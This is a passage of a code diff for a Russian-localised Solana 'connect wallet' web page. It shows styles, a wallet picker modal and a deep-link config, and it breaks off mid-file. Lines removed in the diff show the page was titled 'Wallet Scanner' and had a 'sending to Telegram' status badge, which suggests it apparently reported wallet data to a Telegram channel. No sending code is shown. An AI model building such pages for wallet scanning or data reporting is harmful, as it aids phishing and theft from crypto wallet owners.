@@ -1,19 +1,12 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Solana Wallet Scanner - Mobile Enhanced</title>
-  
-  <!-- Подключаем Solana Web3.js библиотеки -->
-  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-  <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
+  <title>Подключение к кошельку Solana</title>
   
   <!-- Библиотека для определения устройства -->
   <script src="https://cdn.jsdelivr.net/npm/mobile-detect@1.4.5/mobile-detect.min.js"></script>
-  
-  <!-- QR-код генератор -->
-  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
   
   <style>
     body {
@@ -24,6 +17,7 @@
       align-items: center;
       min-height: 100vh;
       margin: 0;
+      color: white;
     }
 
     #connectWalletBtn {
@@ -41,18 +35,6 @@
       background-color: #357abd;
     }
 
-    #connectWalletBtn.connected {
-      background-color: #28a745;
-    }
-
-    #connectWalletBtn.connected:hover {
-      background-color: #218838;
-    }
-
-    .hidden {
-      display: none;
-    }
-
     .modal-overlay {
       position: fixed;
       top: 0;
@@ -63,7 +45,7 @@
       z-index: 1000;
     }
 
-    .connect-wallet, .all-wallets-modal, .qr-modal {
+    .connect-wallet {
       position: fixed;
       top: 50%;
       left: 50%;
@@ -74,16 +56,17 @@
       padding: 20px;
       box-shadow: 0 8px 24px rgba(0,0,0,0.2);
       z-index: 1001;
+      color: #333;
     }
 
-    .connect-header, .modal-header {
+    .connect-header {
       display: flex;
-      align-items: center;
       justify-content: space-between;
+      align-items: center;
       margin-bottom: 20px;
     }
 
-    .connect-header h2, .modal-header h2 {
+    .connect-header h2 {
       margin: 0;
       font-size: 1.2rem;
       font-weight: 600;
@@ -91,7 +74,7 @@
       text-align: center;
     }
 
-    .help-btn, .close-btn, .back-btn {
+    .close-btn {
       background: none;
       border: none;
       font-size: 1.2rem;
@@ -99,15 +82,6 @@
       width: 30px;
       height: 30px;
       color: #333;
-    }
-
-    .help-btn {
-      font-weight: bold;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      border-radius: 50%;
-      background-color: #e0e0e0;
     }
 
     .wallet-list {
@@ -119,13 +93,11 @@
     .wallet-option {
       display: flex;
       align-items: center;
-      justify-content: space-between;
       padding: 10px;
       background: #f5f5f5;
       border-radius: 10px;
       cursor: pointer;
       transition: background 0.3s;
-      position: relative;
     }
 
     .wallet-option:hover {
@@ -145,304 +117,6 @@
       color: #333;
     }
 
-    .wallet-status {
-      font-size: 0.8rem;
-      color: #28a745;
-      margin-left: 10px;
-    }
-
-    .wallet-status.mobile {
-      color: #007bff;
-    }
-
-    .wallet-status.desktop {
-      color: #6c757d;
-    }
-
-    .connection-status {
-      margin-top: 15px;
-      padding: 10px;
-      border-radius: 8px;
-      text-align: center;
-      font-size: 0.9rem;
-    }
-
-    .connection-status.success {
-      background: #d4edda;
-      color: #155724;
-      border: 1px solid #c3e6cb;
-    }
-
-    .connection-status.error {
-      background: #f8d7da;
-      color: #721c24;
-      border: 1px solid #f5c6cb;
-    }
-
-    .connection-status.loading {
-      background: #d1ecf1;
-      color: #0c5460;
-      border: 1px solid #bee5eb;
-    }
-
-    .connection-status.scanning {
-      background: #fff3cd;
-      color: #856404;
-      border: 1px solid #ffeaa7;
-    }
-
-    .wallet-info {
-      margin-top: 15px;
-      padding: 10px;
-      background: #f8f9fa;
-      border-radius: 8px;
-      font-size: 0.85rem;
-    }
-
-    .wallet-info .address {
-      font-family: monospace;
-      word-break: break-all;
-      margin-top: 5px;
-      color: #495057;
-    }
-
-    .get-started {
-      text-align: center;
-      margin-top: 20px;
-      color: #666;
-      font-size: 0.9rem;
-    }
-
-    .get-started a {
-      color: #0000EE;
-      text-decoration: none;
-    }
-
-    .get-started a:hover {
-      text-decoration: underline;
-    }
-
-    .wallet-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 15px;
-      overflow-y: auto;
-      flex-grow: 1;
-    }
-
-    .wallet-item {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      background: #f9f9f9;
-      border-radius: 15px;
-      padding: 10px;
-      cursor: pointer;
-      transition: background 0.3s;
-      user-select: none;
-      position: relative;
-    }
-
-    .wallet-item:hover {
-      background: #e0e0e0;
-    }
-
-    .wallet-item img {
-      width: 80px;
-      height: 80px;
-      margin-bottom: 8px;
-      object-fit: contain;
-      border-radius: 15px;
-    }
-
-    .wallet-item span {
-      font-size: 0.85rem;
-      color: #333;
-      text-align: center;
-    }
-
-    .loading-spinner {
-      display: inline-block;
-      width: 16px;
-      height: 16px;
-      border: 2px solid #f3f3f3;
-      border-top: 2px solid #3498db;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-left: 8px;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    /* QR Code Modal */
-    .qr-modal {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: #fff;
-      border-radius: 20px;
-      width: 350px;
-      padding: 20px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
-      z-index: 1002;
-      text-align: center;
-    }
-
-    .qr-code-container {
-      margin: 20px 0;
-      display: flex;
-      justify-content: center;
-    }
-
-    .qr-code-container canvas {
-      border-radius: 10px;
-      border: 2px solid #e0e0e0;
-    }
-
-    .qr-instructions {
-      color: #666;
-      font-size: 0.9rem;
-      margin-top: 15px;
-    }
-
-    /* Telegram Status Indicator */
-    .telegram-status {
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      padding: 8px 12px;
-      border-radius: 20px;
-      font-size: 0.8rem;
-      font-weight: bold;
-      z-index: 2000;
-      transition: all 0.3s ease;
-    }
-
-    .telegram-status.sending {
-      background: #ffc107;
-      color: #856404;
-    }
-
-    .telegram-status.success {
-      background: #28a745;
-      color: white;
-    }
-
-    .telegram-status.error {
-      background: #dc3545;
-      color: white;
-    }
-
-    /* Initialization Status */
-    .init-status {
-      position: fixed;
-      bottom: 20px;
-      left: 20px;
-      padding: 8px 12px;
-      border-radius: 20px;
-      font-size: 0.8rem;
-      font-weight: bold;
-      z-index: 2000;
-      background: #17a2b8;
-      color: white;
-    }
-
-    /* Mobile Adjustments */
-    @media (max-width: 394px) {
-      .connect-wallet, .all-wallets-modal, .qr-modal {
-        top: auto;
-        bottom: 0;
-        left: 0;
-        right: 0;
-        transform: none;
-        width: 100vw;
-        padding: 15px;
-        border-radius: 15px 15px 0 0;
-        max-height: 85vh;
-        overflow-y: auto;
-        box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-        box-sizing: border-box;
-      }
-
-      .telegram-status {
-        top: 10px;
-        right: 10px;
-        font-size: 0.7rem;
-        padding: 6px 10px;
-      }
-
-      .init-status {
-        bottom: 10px;
-        left: 10px;
-        font-size: 0.7rem;
-        padding: 6px 10px;
-      }
-
-      .wallet-item img {
-        width: 60px;
-        height: 60px;
-        margin-bottom: 6px;
-      }
-
-      .wallet-item span {
-        font-size: 0.8rem;
-      }
-    }
-    
-    /* Добавляем стили для QR-кода и deep links */
-    .qr-section {
-      margin-top: 20px;
-      padding: 15px;
-      background: #f8f9fa;
-      border-radius: 10px;
-      text-align: center;
-    }
-    
-    .deep-link-section {
-      margin-top: 15px;
-      padding: 10px;
-      background: #f0f4ff;
-      border-radius: 8px;
-    }
-    
-    .deep-link-btn {
-      background: #4a90e2;
-      color: white;
-      border: none;
-      padding: 8px 16px;
-      border-radius: 5px;
-      cursor: pointer;
-      margin: 5px;
-      font-size: 0.9rem;
-      transition: background-color 0.3s;
-    }
-    
-    .deep-link-btn:hover {
-      background: #357abd;
-    }
-    
-    .deep-link-btn.phantom {
-      background: #AB9FF2;
-    }
-    
-    .deep-link-btn.phantom:hover {
-      background: #9B8FF2;
-    }
-    
-    .device-info {
-      margin-top: 10px;
-      padding: 8px;
-      background: #e9ecef;
-      border-radius: 5px;
-      font-size: 0.8rem;
-      color: #495057;
-    }
-
     .mobile-instructions {
       background: #e7f3ff;
       border: 1px solid #b3d9ff;
@@ -453,961 +127,140 @@
       color: #0066cc;
     }
 
-    .desktop-instructions {
-      background: #f8f9fa;
-      border: 1px solid #dee2e6;
-      border-radius: 8px;
-      padding: 12px;
-      margin: 15px 0;
-      font-size: 0.9rem;
-      color: #495057;
+    @media (max-width: 394px) {
+      .connect-wallet {
+        width: 100vw;
+        padding: 15px;
+        border-radius: 15px 15px 0 0;
+        top: auto;
+        bottom: 0;
+        left: 0;
+        transform: none;
+      }
     }
   </style>
 </head>
 <body>
-  <!-- Telegram Status Indicator -->
-  <div id="telegramStatus" class="telegram-status hidden">📤 Отправка в Telegram...</div>
+  <!-- Кнопка для открытия модального окна -->
+  <button id="connectWalletBtn">Подключиться к кошельку</button>
 
-  <!-- Initialization Status -->
-  <div id="initStatus" class="init-status">🔄 Инициализация...</div>
-
-  <!-- Button to open the modal -->
-  <button id="connectWalletBtn">Connect Wallet</button>
-
-  <!-- Modal Overlay -->
+  <!-- Оверлей модального окна -->
   <div id="modalOverlay" class="modal-overlay hidden"></div>
 
-  <!-- Connect Wallet Modal -->
-  <div id="connectWalletModal" class="connect-wallet">
+  <!-- Модальное окно подключения кошелька -->
+  <div id="connectWalletModal" class="connect-wallet hidden">
     <div class="connect-header">
-      <button class="help-btn" title="Help">?</button>
-      <h2>Connect Wallet</h2>
-      <button class="close-btn" title="Close">×</button>
+      <span></span>
+      <h2>Выберите кошелек</h2>
+      <button class="close-btn" title="Закрыть">×</button>
     </div>
     
-    <!-- Connection Status Display -->
-    <div id="connectionStatus" class="connection-status hidden"></div>
-    
-    <!-- Wallet Info Display -->
-    <div id="walletInfo" class="wallet-info hidden">
-      <div><strong>Connected Wallet:</strong> <span id="connectedWalletName"></span></div>
-      <div><strong>Address:</strong></div>
-      <div class="address" id="walletAddress"></div>
-      
-      <div style="margin-top: 10px;">
-        <button id="disconnectBtn" style="background: #dc3545; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer;">Disconnect</button>
-        <button id="rescanBtn" style="background: #28a745; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; margin-left: 5px;">Rescan</button>
-      </div>
+    <div id="mobileInstructions" class="mobile-instructions hidden">
+      <strong>📱 Инструкции для телефона:</strong><br>
+      1. Убедитесь, что приложение кошелька установлено<br>
+      2. Нажмите на кошелек ниже, чтобы открыть сайт в его браузере
     </div>
 
     <div class="wallet-list">
       <div class="wallet-option" data-wallet="phantom">
         <img src="https://s.iimg.su/s/26/XUns4qhYptxMAGIMJkK8GXJiTvRMnTO8ZqAcKqvx.png" alt="Phantom" />
         <span>Phantom</span>
-        <div class="wallet-status" id="phantomStatus">Checking...</div>
       </div>
       <div class="wallet-option" data-wallet="solflare">
         <img src="https://s.iimg.su/s/26/AaFiC9SIvF95PZEblauprFwWZ7bXKuO2NRYnJVIH.png" alt="Solflare" />
         <span>Solflare</span>
-        <div class="wallet-status" id="solflareStatus">Checking...</div>
       </div>
-      <div class="wallet-option" data-wallet="trustwallet">
-        <img src="https://s.iimg.su/s/26/mA9QKT4xSAh5HifKsQIN8m9oZxn3ODrKcl1XQdtn.png" alt="Trust Wallet" />
-        <span>Trust Wallet</span>
-        <div class="wallet-status" id="trustwalletStatus">Checking...</div>
-      </div>
-      <div class="wallet-option" data-wallet="coinbase">
-        <img src="https://s.iimg.su/s/26/75HQqHl0g9lz9qIFBEHNkRZknbnJVc69aqI5PlGK.png" alt="Coinbase" />
-        <span>Coinbase</span>
-        <div class="wallet-status" id="coinbaseStatus">Checking...</div>
-      </div>
-      <div class="wallet-option" data-wallet="bitget">
-        <img src="https://s.iimg.su/s/26/HrAB9KDj99AnQOQZcxhY0htKY0oUFcONhY9jSUhP.png" alt="Bitget Wallet" />
-        <span>Bitget Wallet</span>
-        <div class="wallet-status" id="bitgetStatus">Checking...</div>
-      </div>
-      <div class="wallet-option" id="allWalletsBtn">
-        <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20200%20200%22%3E%3Cpath%20d=%22M0%200h200v200H0z%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%22121%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%4241%22%20x=%22121%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%4241%22%20x=%2279.5%22%20y=%2279.5%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3C/svg%3E" alt="All Wallets" />
-        <span>All Wallets</span>
-      </div>
-    </div>
-    <div class="get-started">
-      Haven't got a wallet? <a href="https://phantom.app/" target="_blank">Get started</a>
-    </div>
-  </div>
-
-  <!-- All Wallets Modal -->
-  <div id="allWalletsModal" class="all-wallets-modal hidden">
-    <div class="modal-header">
-      <button class="back-btn" title="Back">←</button>
-      <h2>All Wallets</h2>
-      <button class="close-btn" title="Close">×</button>
-    </div>
-    <div class="wallet-grid">
-      <div class="wallet-item" data-wallet="phantom" tabindex="0">
-        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%20128%20128'%3E%3Cpath%20fill='%23AB9FF2'%20d='M0%200h128v128H0z'/%3E%3Cpath%20fill='%23FFFDF8'%20fill-rule='evenodd'%20d='M55.6%2082.1C51%2089.5%2043%2098.7%2032.3%2098.7c-5%200-9.9-2-9.9-11%200-23%2031.2-58.4%2060.2-58.4%2016.5%200%2023.1%2011.5%2023.1%2024.5%200%2016.6-10.8%2035.7-21.6%2035.7-3.4%200-5-1.9-5-4.8%200-.8%200-1.6.3-2.6-3.7%206.3-10.7%2012.1-17.4%2012.1-4.8%200-7.3-3-7.3-7.3%200-1.5.4-3.1%201-4.8Zm25-28.8c0%203.8-2.2%205.7-4.7%205.7-2.6%200-4.8-1.9-4.8-5.7%200-3.8%202.2-5.7%204.8-5.7%202.5%200%204.7%202%204.7%205.7Zm14.2%200c0%203.8-2.2%205.7-4.7%205.7-2.6%200-4.8-1.9-4.8-5.7%200-3.8%202.2-5.7%204.8-5.7%202.5%200%204.7%202%204.7%205.7Z'%20clip-rule='evenodd'/%3E%3C/svg%3E" alt="Phantom" />
-        <span>Phantom</span>
-      </div>
-      <div class="wallet-item" data-wallet="solflare" tabindex="0">
-        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%20350%20350'%3E%3Cpath%20id='a'%20fill='%23FFEF46'%20d='M0%200h350v350H0z'/%3E%3Cpath%20fill='%2302050A'%20d='m171%20183%2014-14%2026%209c18%206%2027%2017%2027%2032%200%2011-5%2019-13%2028l-3%203%201-7c4-24-4-35-28-43l-24-8Zm-36-84%2072%2024-15%2015-38-13c-13-4-18-11-19-26Zm-5%20123%2017-16%2031%2010c16%205%2022%2013%2020%2030l-68-24Zm-20-70c0-5%202-9%206-13%204%206%2012%2012%2024%2016l25%208-14%2014-25-8c-12-4-16-10-16-17Zm76%20127c53-36%2081-60%2081-89%200-20-11-31-37-39l-19-7%2053-51-11-11-16%2014-74-25c-23%208-52%2030-52%2052l1%207c-19%2011-27%2022-27%2034s6%2024%2026%2030l16%206-55%2053%2011%2011%2017-16%2086%2031Z'/%3E%3C/svg%3E" alt="Solflare" />
-        <span>Solflare</span>
-      </div>
-      <div class="wallet-item" data-wallet="trustwallet" tabindex="0">
-        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20500%20500'%20fill='white'%3E%3Cdefs%3E%3ClinearGradient%20id='a'%20x1='609.58'%20x2='500.46'%20y1='-1336.58'%20y2='-1679.92'%20gradientTransform='matrix(1%200%200%20-.98%20-255.4%20-1243.33)'%20gradientUnits='userSpaceOnUse'%3E%3Cstop%20offset='.02'%20stop-color='%2300f'%3E%3C/stop%3E%3Cstop%20offset='.08'%20stop-color='%230094ff'%3E%3C/stop%3E%3Cstop%20offset='.16'%20stop-color='%2348ff91'%3E%3C/stop%3E%3Cstop%20offset='.42'%20stop-color='%230094ff'%3E%3C/stop%3E%3Cstop%20offset='.68'%20stop-color='%230038ff'%3E%3C/stop%3E%3Cstop%20offset='.9'%20stop-color='%230500ff'%3E%3C/stop%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath%20fill='%23fff'%20d='M0%200h500v500H0z'%3E%3C/path%3E%3Cpath%20fill='%230500ff'%20d='M105%20141.22%20250%2095v320c-103.57-42.67-145-124.45-145-170.66V141.22Z'%3E%3C/path%3E%3Cpath%20fill='url(%23a)'%20d='M395%20141.22%20250%2095v320c103.57-42.67%20145-124.45%20145-170.66V141.22Z'%3E%3C/path%3E%3C/svg%3E" alt="Trust Wallet" />
-        <span>Trust Wallet</span>
-      </div>
-      <div class="wallet-item" data-wallet="coinbase" tabindex="0">
-        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%201024%201024'%3E%3Cpath%20fill='%230052FF'%20d='M0%200h1024v1024H0z'/%3E%3Cpath%20fill='%23fff'%20fill-rule='evenodd'%20d='M152%20512a360%20360%200%201%200%20720%200%20360%20360%200%200%200-720%200Zm268-116c-13%200-24%2011-24%2024v184c0%2013%2011%2024%2024%2024h184c13%200%2024-11%2024-24V420c0-13-11-24-24-24H420Z'%20clip-rule='evenodd'/%3E%3C/svg%3E" alt="Coinbase" />
-        <span>Coinbase</span>
-      </div>
-      <div class="wallet-item" data-wallet="bitget" tabindex="0">
-        <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20fill=%22none%22%20viewBox=%220%200%20512%20512%22%3E%3Cpath%20fill=%22%23001F29%22%20d=%22M0%200h512v512H0z%22/%3E%3Cpath%20fill=%22%2300F0FF%22%20d=%22M220%2096h-55c-11%200-15%2014-7%2022l125%20125c4%204%206%208%207%2013-1%205-3%209-7%2012L158%20393c-8%209-4%2023%207%2023h83c12%200%2019-7%2025-13l113-113c9-9%2017-21%2017-34%200-14-8-26-17-35L273%20109c-6-7-13-13-25-13h-28Z%22/%3E%3C/svg%3E" alt="Bitget Wallet" />
-        <span>Bitget Wallet</span>
-      </div>
-      <div class="wallet-item" data-wallet="backpack" tabindex="0">
-        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='10%2010%20220%20220'%3E%3Cpath%20fill='%23fff'%20d='M0%200h240v240H0z'/%3E%3Cpath%20fill='%23EB4646'%20fill-rule='evenodd'%20d='M129%2053c5%200%2010%200%2014%202-4-10-13-13-23-13s-18%203-23%2013c5-2%209-2%2014-2h18Zm-19%2010c-24%200-37%2018-37%2041v24c0%202%202%204%204%204h86c2%200%204-2%204-4v-24c0-23-16-41-39-41h-18Zm10%2041a15%2015%200%201%200%200-30%2015%2015%200%200%200%200%2030Zm-47%2042c0-3%202-5%204-5h86c2%200%204%202%204%205v24c0%205-4%209-9%209H82c-5%200-9-4-9-9v-24Z'%20clip-rule='evenodd'/%3E%3C/svg%3E" alt="Backpack" />
-        <span>Backpack</span>
-      </div>
-      <div class="wallet-item" data-wallet="okx" tabindex="0">
-        <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20200%20200%22%3E%3Cpath%20d=%22M0%200h200v200H0z%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%22121%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%4241%22%20x=%22121%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%4241%22%20x=%2279.5%22%20y=%2279.5%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3C/svg%3E" alt="OKX Wallet" />
-        <span>OKX Wallet</span>
-      </div>
-      <div class="wallet-item" data-wallet="exodus" tabindex="0">
-        <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20xmlns:bx=%22https://boxy-svg.com%22%20viewBox=%220%200%20295%20295%22%3E%3Cdefs%3E%3ClinearGradient%20bx:pinned=%22true%22%20id=%22a%22%3E%3Cstop%20offset=%220%22%20stop-color=%22%230a0c1a%22/%3E%3Cstop%20offset=%221%22%20stop-color=%22%23333349%22/%3E%3C/linearGradient%3E%3ClinearGradient%20id=%22b%22%20x1=%22147.5%22%20x2=%22147.5%22%20y1=%220%22%20y2=%22295%22%20gradientTransform=%22matrix(-1%20-1%201%20-1%20105.4%20399)%22%20gradientUnits=%22userSpaceOnUse%22%20href=%22%23a%22/%3E%3ClinearGradient%20id=%22c%22%20x1=%22175.8%22%20x2=%22117.2%22%20y1=%22219.5%22%20y2=%22-22.6%22%20gradientTransform=%22translate(43.9%2044.5)%22%20gradientUnits=%22userSpaceOnUse%22%3E%3Cstop%20stop-color=%22%230B46F9%22/%3E%3Cstop%20offset=%221%22%20stop-color=%22%23BBFBE0%22/%3E%3C/linearGradient%3E%3ClinearGradient%20id=%22d%22%20x1=%22175.8%22%20x2=%22117.2%22%20y1=%22219.5%22%20y2=%22-22.6%22%20gradientTransform=%22translate(43.9%2044.5)%22%20gradientUnits=%22userSpaceOnUse%22%3E%3Cstop%20stop-color=%22%230B46F9%22/%3E%3Cstop%20offset=%221%22%20stop-color=%22%23BBFBE0%22/%3E%3C/linearGradient%3E%3ClinearGradient%20id=%22e%22%20x1=%22175.8%22%20x2=%22117.2%22%20y1=%22219.5%22%20y2=%22-22.6%22%20gradientUnits=%22userSpaceOnUse%22%3E%3Cstop%20stop-color=%22%230B46F9%22/%3E%3Cstop%20offset=%221%22%20stop-color=%22%23BBFBE0%22/%3E%3C/linearGradient%3E%3ClinearGradient%20id=%22f%22%20x1=%22175.8%22%20x2=%22117.2%22%20y1=%22219.5%22%20y2=%22-22.6%22%20gradientUnits=%22userSpaceOnUse%22%3E%3Cstop%20stop-color=%22%230B46F9%22/%3E%3Cstop%20offset=%221%22%20stop-color=%22%23BBFBE0%22/%3E%3C/linearGradient%3E%3ClinearGradient%20id=%22h%22%20x1=%2215.4%22%20x2=%22116.8%22%20y1=%2246.2%22%20y2=%22121.9%22%20gradientUnits=%22userSpaceOnUse%22%3E%3Cstop%20offset=%22.1%22%20stop-color=%22%238952FF%22%20stop-opacity=%22.9%22/%3E%3Cstop%20offset=%221%22%20stop-color=%22%23DABDFF%22%20stop-opacity=%220%22/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath%20fill=%22url(%23b)%22%20d=%22M0%200h295v295H0z%22/%3E%3Cpath%20fill=%22url(%23c)%22%20d=%22M248.6%20102%20161%2044.5v32.2l56.3%2036.5-6.6%2021h-49.7v26.6h49.7l6.6%2021-56.3%2036.5v32.2l87.7-57.3-14.3-45.6%2014.3-45.6Z%22/%3E%3Cpath%20fill=%22url(%23d)%22%20d=%22M84.6%20160.8h49.5v-26.6H84.4l-6.4-21%2056-36.5V44.5L46.4%20102l14.4%2045.6-14.4%2045.6%2088%2057.3v-32.2L78%20181.8l6.6-21Z%22/%3E%3Cmask%20id=%22g%22%20width=%22203%22%20height=%22206%22%20x=%222%22%20y=%220%22%20maskUnits=%22userSpaceOnUse%22%20style=%22mask-type:alpha%22%3E%3Cpath%20fill=%22url(%23e)%22%20d=%22M204.1%2057.3%20116.7%200v32l56%2036.5-6.5%2020.9h-49.5v26.5h49.5l6.6%2021-56.1%2036.4v32l87.4-57.1-14.3-45.4%2014.3-45.5Z%22/%3E%3Cpath%20fill=%22url(%23f)%22%20d=%22M40.6%20116h49.3V89.3H40.4L34%2068.5l55.9-36.4V0L2.5%2057.3l14.3%2045.5-14.3%2045.4L90%20205.3v-32L34%20136.8l6.6-20.9Z%22/%3E%3C/mask%3E%3Cg%20mask=%22url(%23g)%22%20transform=%22translate(43.9%2044.5)%22%3E%3Cpath%20fill=%22url(%23h)%22%20d=%22M2.6%200h200.2v205.3H2.6z%22/%3E%3C/g%3E%3C/svg%3E" alt="Exodus" />
-        <span>Exodus</span>
-      </div>
-      <div class="wallet-item" data-wallet="safepal" tabindex="0">
-        <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20fill=%22none%22%20viewBox=%220%200%20260%20260%22%3E%3Cpath%20fill=%22%234A21EF%22%20d=%22M0%200h260v260H0z%22/%3E%3Cpath%20fill=%22%23fff%22%20d=%22M121%2057.5c-4.4%200-8.6%201.8-11.8%205l-49.4%2049.3a9.6%209.6%200%200%200%200%2013.6l32.4%2032.4v-57.4c0-4.2%203.4-7.7%207.7-7.7h68l35.3-35.2H121ZM92.2%20168.5h68c4.3%200%207.8-3.5%207.8-7.8v-57.3l32.4%2032.4a9.6%209.6%200%200%201%200%2013.6l-49.5%2049.4c-3.1%203.1-7.4%204.9-11.8%204.9H57l35.2-35.2Z%22/%3E%3C/svg%3E" alt="SafePal" />
-        <span>SafePal</span>
-      </div>
-    </div>
-  </div>
-
-  <!-- QR Code Modal -->
-  <div id="qrModal" class="qr-modal hidden">
-    <div class="connect-header">
-      <div></div>
-      <h2>Connect <span id="qrWalletName">Wallet</span></h2>
-      <button class="close-btn" title="Close">×</button>
-    </div>
-    
-    <div id="mobileInstructions" class="mobile-instructions hidden">
-      <strong>📱 Mobile Instructions:</strong><br>
-      1. Make sure <span id="walletAppName">Phantom</span> app is installed<br>
-      2. Tap "Open in App" button below<br>
-      3. Approve connection in the app<br>
-      4. Return to this browser tab
-    </div>
-
-    <div id="desktopInstructions" class="desktop-instructions hidden">
-      <strong>💻 Desktop Instructions:</strong><br>
-      1. Install <span id="walletExtensionName">Phantom</span> browser extension<br>
-      2. Create or import your wallet<br>
-      3. Refresh this page and try connecting again
-    </div>
-    
-    <div class="qr-code-container">
-      <canvas id="qrCanvas"></canvas>
-    </div>
-    
-    <div class="qr-instructions">
-      Scan this QR code with your mobile wallet app
-    </div>
-    
-    <div class="deep-link-section">
-      <div style="margin-bottom: 10px; font-weight: bold;">Quick Actions:</div>
-      <div id="deepLinkButtons"></div>
     </div>
   </div>
 
   <script>
-    // ============================================================================
-    // ENHANCED DEVICE DETECTION AND WALLET ADAPTER LOGIC
-    // ============================================================================
-    
-    const md = new MobileDetect(window.navigator.userAgent);
-    
-    const WALLET_ADAPTER_CONFIG = {
+    // Конфигурация кошельков
+    const WALLET_CONFIG = {
       phantom: {
         name: 'Phantom',
-        logo: 'https://s.iimg.su/s/26/XUns4qhYptxMAGIMJkK8GXJiTvRMnTO8ZqAcKqvx.png',
-        readyState: () => window.phantom?.solana?.isPhantom ? 'Installed' : 'NotDetected',
         mobile: {
-          android: {
-            scheme: 'phantom://',
-            universal: 'https://phantom.app/ul/browse/',
-            storeUrl: 'https://play.google.com/store/apps/details?id=app.phantom'
-          },
-          ios: {
-            scheme: 'phantom://',
-            universal: 'https://phantom.app/ul/browse/',
-            storeUrl: 'https://apps.apple.com/app/phantom-solana-wallet/id1598432977'
-          }
-        },
-        desktop: {
-          chrome: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa',
-          firefox: 'https://addons.mozilla.org/en-US/firefox/addon/phantom-app/'
-        },
-        connect: async () => {
-          const provider = window.phantom?.solana;
-          if (!provider) throw new Error('Phantom wallet not found');
-          const response = await provider.connect();
-          return { publicKey: response.publicKey.toString(), provider };
+          android: { scheme: 'phantom://', universal: 'https://phantom.app/ul/browse/' },
+          ios: { scheme: 'phantom://', universal: 'https://phantom.app/ul/browse/' }
         }
       },
       solflare: {
         name: 'Solflare',
-        logo: 'https://s.iimg.su/s/26/AaFiC9SIvF95PZEblauprFwWZ7bXKuO2NRYnJVIH.png',
-        readyState: () => window.solflare?.isSolflare ? 'Installed' : 'NotDetected',
         mobile: {
-          android: {
-            scheme: 'solflare://',
-            universal: 'https://solflare.com/ul/browse/',
-            storeUrl: 'https://play.google.com/store/apps/details?id=com.solflare.mobile'
-          },
-          ios: {
-            scheme: 'solflare://',
-            universal: 'https://solflare.com/ul/browse/',
-            storeUrl: 'https://apps.apple.com/app/solflare/id1580902717'
-          }
-        },
-        desktop: {
-          chrome: 'https://chrome.google.com/webstore/detail/solflare-wallet/bhhhlbepdkbapadjdnnojkbgioiodbic'
-        },
-        connect: async () => {
-          const provider = window.solflare;
-          if (!provider) throw new Error('Solflare wallet not found');
-          await provider.connect();
-          return { publicKey: provider.publicKey.toString(), provider };
-        }
-      },
-      trustwallet: {
-        name: 'Trust Wallet',
-        logo: 'https://s.iimg.su/s/26/mA9QKT4xSAh5HifKsQIN8m9oZxn3ODrKcl1XQdtn.png',
-        readyState: () => window.trustwallet?.solana ? 'Installed' : 'NotDetected',
-        mobile: {
-          android: {
-            scheme: 'trust://',
-            universal: 'https://link.trustwallet.com/',
-            storeUrl: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp'
-          },
-          ios: {
-            scheme: 'trust://',
-            universal: 'https://link.trustwallet.com/',
